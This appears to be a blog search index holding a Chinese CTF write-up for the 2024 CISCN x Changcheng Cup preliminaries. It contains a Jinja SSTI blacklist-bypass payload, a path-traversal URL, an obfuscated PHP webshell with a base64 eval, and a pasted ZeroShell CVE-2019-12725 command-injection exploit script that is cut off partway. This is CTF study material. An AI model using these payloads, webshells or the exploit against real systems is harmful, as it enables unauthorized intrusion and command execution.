<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024 CISCN x 长城杯铁人三项 初赛 WriteUp</title>
      <link href="/posts/cbe4da55.html"/>
      <url>/posts/cbe4da55.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h2><p>题目一进去就给了源码,里面是一个简单的 ssti,但是无回显不出网</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request, render_template_string</span><br><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line">import html</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def <span class="title function_ invoke__">source</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.<span class="title function_ invoke__">escape</span>(f.<span class="title function_ invoke__">read</span>())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_ invoke__">template</span>():</span><br><span class="line">    template_code = request.form.<span class="title function_ invoke__">get</span>(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black in blacklist:</span><br><span class="line">        <span class="keyword">if</span> black in template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = <span class="title function_ invoke__">render_template_string</span>(template_code)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">if</span> result is not None <span class="keyword">else</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPProxyHandler</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">target_host</span>, <span class="title">target_port</span>):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">target_host</span> = <span class="title">target_host</span></span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">target_port</span> = <span class="title">target_port</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">handle_request</span>(<span class="title">self</span>, <span class="title">client_socket</span>):</span></span><br><span class="line"><span class="class">        <span class="title">try</span>:</span></span><br><span class="line"><span class="class">            <span class="title">request_data</span> = <span class="title">b</span>&quot;&quot;</span></span><br><span class="line"><span class="class">            <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="class">                <span class="title">chunk</span> = <span class="title">client_socket</span>.<span class="title">recv</span>(4096)</span></span><br><span class="line"><span class="class">                <span class="title">request_data</span> += <span class="title">chunk</span></span></span><br><span class="line"><span class="class">                <span class="title">if</span> <span class="title">len</span>(<span class="title">chunk</span>) &lt; 4096:</span></span><br><span class="line"><span class="class">                    <span class="title">break</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">not</span> <span class="title">request_data</span>:</span></span><br><span class="line"><span class="class">                <span class="title">client_socket</span>.<span class="title">close</span>()</span></span><br><span class="line"><span class="class">                <span class="title">return</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">with</span> <span class="title">socket</span>.<span class="title">socket</span>(<span class="title">socket</span>.<span class="title">AF_INET</span>, <span class="title">socket</span>.<span class="title">SOCK_STREAM</span>) <span class="title">as</span> <span class="title">proxy_socket</span>:</span></span><br><span class="line"><span class="class">                <span class="title">proxy_socket</span>.<span class="title">connect</span>((<span class="title">self</span>.<span class="title">target_host</span>, <span class="title">self</span>.<span class="title">target_port</span>))</span></span><br><span class="line"><span class="class">                <span class="title">proxy_socket</span>.<span class="title">sendall</span>(<span class="title">request_data</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                <span class="title">response_data</span> = <span class="title">b</span>&quot;&quot;</span></span><br><span class="line"><span class="class">                <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="class">                    <span class="title">chunk</span> = <span class="title">proxy_socket</span>.<span class="title">recv</span>(4096)</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> <span class="title">not</span> <span class="title">chunk</span>:</span></span><br><span class="line"><span class="class">                        <span class="title">break</span></span></span><br><span class="line"><span class="class">                    <span class="title">response_data</span> += <span class="title">chunk</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">header_end</span> = <span class="title">response_data</span>.<span class="title">rfind</span>(<span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>\<span class="title">r</span>\<span class="title">n</span>&quot;)</span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">header_end</span> != -1:</span></span><br><span class="line"><span class="class">                <span class="title">body</span> = <span class="title">response_data</span>[<span class="title">header_end</span> + 4:]</span></span><br><span class="line"><span class="class">            <span class="title">else</span>:</span></span><br><span class="line"><span class="class">                <span class="title">body</span> = <span class="title">response_data</span></span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">            <span class="title">response_body</span> = <span class="title">body</span></span></span><br><span class="line"><span class="class">            <span class="title">response</span> = <span class="title">b</span>&quot;<span class="title">HTTP</span>/1.1 200 <span class="title">OK</span>\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;<span class="title">Content</span>-<span class="title">Length</span>: &quot; + <span class="title">str</span>(<span class="title">len</span>(<span class="title">response_body</span>)).<span class="title">encode</span>() + <span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;<span class="title">Content</span>-<span class="title">Type</span>: <span class="title">text</span>/<span class="title">html</span>; <span class="title">charset</span>=<span class="title">utf</span>-8\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>&quot; + <span class="title">response_body</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">client_socket</span>.<span class="title">sendall</span>(<span class="title">response</span>)</span></span><br><span class="line"><span class="class">        <span class="title">except</span> <span class="title">Exception</span> <span class="title">as</span> <span class="title">e</span>:</span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">f</span>&quot;<span class="title">Proxy</span> <span class="title">Error</span>: </span>&#123;e&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">        finally:</span></span><br><span class="line"><span class="string">            client_socket.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def start_proxy_server(host, port, target_host, target_port):</span></span><br><span class="line"><span class="string">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span></span><br><span class="line"><span class="string">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line"><span class="string">    server_socket.bind((host, port))</span></span><br><span class="line"><span class="string">    server_socket.listen(100)</span></span><br><span class="line"><span class="string">    print(f&quot;</span>Proxy server is running on &#123;host&#125;:&#123;port&#125; <span class="keyword">and</span> forwarding to &#123;target_host&#125;:&#123;target_port&#125;...<span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        while True:</span></span><br><span class="line"><span class="string">            client_socket, addr = server_socket.accept()</span></span><br><span class="line"><span class="string">            print(f&quot;</span>Connection <span class="keyword">from</span> &#123;addr&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span></span><br><span class="line"><span class="string">            thread.daemon = True</span></span><br><span class="line"><span class="string">            thread.start()</span></span><br><span class="line"><span class="string">    except KeyboardInterrupt:</span></span><br><span class="line"><span class="string">        print(&quot;</span>Shutting down proxy server...<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    finally:</span></span><br><span class="line"><span class="string">        server_socket.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def run_flask_app():</span></span><br><span class="line"><span class="string">    app.run(debug=False, host=&#x27;127.0.0.1&#x27;, port=5000)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;</span>__main__<span class="string">&quot;:</span></span><br><span class="line"><span class="string">    proxy_host = &quot;</span><span class="number">0.0</span>.<span class="number">0.0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    proxy_port = 5001</span></span><br><span class="line"><span class="string">    target_host = &quot;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    target_port = 5000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 安全反代，防止针对响应头的攻击</span></span><br><span class="line"><span class="string">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span></span><br><span class="line"><span class="string">    proxy_thread.daemon = True</span></span><br><span class="line"><span class="string">    proxy_thread.start()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    print(&quot;</span>Starting Flask app...<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    run_flask_app()</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>直接本地启服务,设置回显让 fenjing 一把梭得出绕过黑名单的命令</p><p>一开始想复杂了,打算拿内存马打,之后又看到一篇<a href="https://xz.aliyun.com/t/16325?time__1311=GuD%3D0KAKYK7KiKDsD7%2Bd0%3D6RL%3DdGC3IztjeD#toc-2">基于错误页面的回显</a>,但是拿 fenjing 的 payload 梭不好使.打算自己本地手敲一个。</p><p>想尝试写文件的，但是页面还是会报错</p><p>后来又想到之前鹏程杯那道 python 题,也是无回显不出网,当时直接把 flag 写到 app.py 上,这次也试试看.</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084800322-1614287045.png" alt="image-20241216084748633"></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>gl%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;globals&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>bu%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;builtins&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>im%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;i&#x27;</span><span class="string">&#x27;mport&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>oe%<span class="number">3</span>D<span class="string">&#x27;so&#x27;</span>%<span class="number">5</span>B%<span class="number">3</span>A%<span class="number">3</span>A-<span class="number">1</span>%<span class="number">5</span>D%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">7</span>Bg.pop%<span class="number">5</span>Bgl%<span class="number">5</span>D%<span class="number">5</span>Bbu%<span class="number">5</span>D%<span class="number">5</span>Bim%<span class="number">5</span>D(oe)%<span class="number">5</span>B<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;open&#x27;</span>%<span class="number">5</span>D(<span class="string">&#x27;cat%20%2Fflag%20%3E%20app.py&#x27;</span>).<span class="title function_ invoke__">read</span>()%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084920779-735291526.png" alt="image-20241216084910073"></p><p>工具链接：<a href="https://github.com/Marven11/FenJing">https://github.com/Marven11/FenJing</a></p><p><code>flag&#123;9cb84d61-9040-47d7-b5ef-4c88ffa6e317&#125;</code></p><h2 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h2><p>这题一进去就是一个很可疑,带有文件包含的 url,查看源代码后更是有两个提示</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084927363-2098915863.png" alt="image-20241216084916854"></p><p>肯定是需要文件包含来读取这两个文件.</p><p>经过在 file 参数上的 fuzz,发现他限制长度13 过滤<code>php://</code>, <code>data</code> ,<code>input</code>,这样伪协议几乎是用不了</p><p>在尝试在 file 参数上进行目录穿越的时候发现<code>../</code>不被解析,然后<code>../</code>也没被 ban</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084932527-2092266536.png" alt="image-20241216084921904"></p><p>既然他 ban <code>../</code>的情况下,那么就是将<code>../</code>过滤了,尝试传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//eci-2zecjw6gho6wjsdwij1l.cloudeci1.ichunqiu.com/index.php?file=..././tips.php</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084940869-327419950.png" alt="image-20241216084930190"></p><p>之后访问 hackme.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$lJbGIY</span>=<span class="string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="variable">$OlWYMv</span>=<span class="string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<span class="variable">$lapUCm</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$YwzIst</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;;<span class="variable">$OxirhK</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$YpAUWC</span>=<span class="variable">$OxirhK</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OxirhK</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OxirhK</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$rVkKjU</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">13</span>&#125;;<span class="variable">$YwzIst</span>.=<span class="variable">$lapUCm</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;;<span class="keyword">eval</span>(<span class="variable">$YwzIst</span>(<span class="string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是一个混淆的代码,本地反混淆得到连接密码,直接蚁剑连接</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084950610-1843665184.png" alt="image-20241216084939618"></p><p>由于前面的 tips.php 能看到 disable_function 禁用了许多危险函数,在 LFI 文件夹新建一个马</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085041869-313494412.png" alt="image-20241216085031196"></p><p>再次用蚁剑连接 a.php,并用插件来绕过 disable_fuction 即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085047825-286970171.png" alt="image-20241216085036873"></p><p>连接生成的<code>.antproxy.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085054238-2085140919.png" alt="image-20241216085043576"></p><p>通过 find 找到 flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085059272-25961471.png" alt="image-20241216085048690"></p><p><code>flag&#123;91a89c19-e322-4ceb-8789-0bbc09b033f5&#125;</code></p><h1 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a>威胁检测与网络流量分析</h1><h2 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h2><p>直接CTF-NetA扫描，看见Referer。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085136211-1607001841.png" alt="image-20241216085125418"></p><p>直接Cyberchef解码，得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085204370-212498903.png" alt="image-20241216085153708"></p><p><code>flag&#123;6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A&#125;</code></p><h2 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h2><p>根据手册搭建环境，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085229026-1094870602.png" alt="image-20241216085218365"></p><p>然后去网上搜zeroshell的exp直接搜到CVE-2019-12725随便找一个exp。我找的这个<a href="https://gryffinbit.top/2022/11/16/ZeroShell-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-12725/">CVE-2019-12725</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">url_list=[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机ua</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ua</span>():</span><br><span class="line">first_num = random.randint(<span class="number">55</span>, <span class="number">62</span>)</span><br><span class="line">third_num = random.randint(<span class="number">0</span>, <span class="number">3200</span>)</span><br><span class="line">fourth_num = random.randint(<span class="number">0</span>, <span class="number">140</span>)</span><br><span class="line">os_type = [</span><br><span class="line"><span class="string">&#x27;(Windows NT 6.1; WOW64)&#x27;</span>, <span class="string">&#x27;(Windows NT 10.0; WOW64)&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;(Macintosh; Intel Mac OS X 10_12_6)&#x27;</span></span><br><span class="line">]</span><br><span class="line">chrome_version = <span class="string">&#x27;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(first_num, third_num, fourth_num)</span><br><span class="line"></span><br><span class="line">ua = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;Mozilla/5.0&#x27;</span>, random.choice(os_type), <span class="string">&#x27;AppleWebKit/537.36&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;(KHTML, like Gecko)&#x27;</span>, chrome_version, <span class="string">&#x27;Safari/537.36&#x27;</span>]</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">return</span> ua</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_vuln</span>(<span class="params">url</span>):</span><br><span class="line">url = parse.urlparse(url)</span><br><span class="line">url2=url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc </span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># data=base64.b64encode(&quot;eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=&quot;)</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res2 = requests.get(url2 + <span class="string">&#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27&#x27;</span>,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res2.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;uid&quot;</span> <span class="keyword">in</span> res2.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[32m[+]%s is vuln\033[0m&quot;</span> %url2)</span><br><span class="line"><span 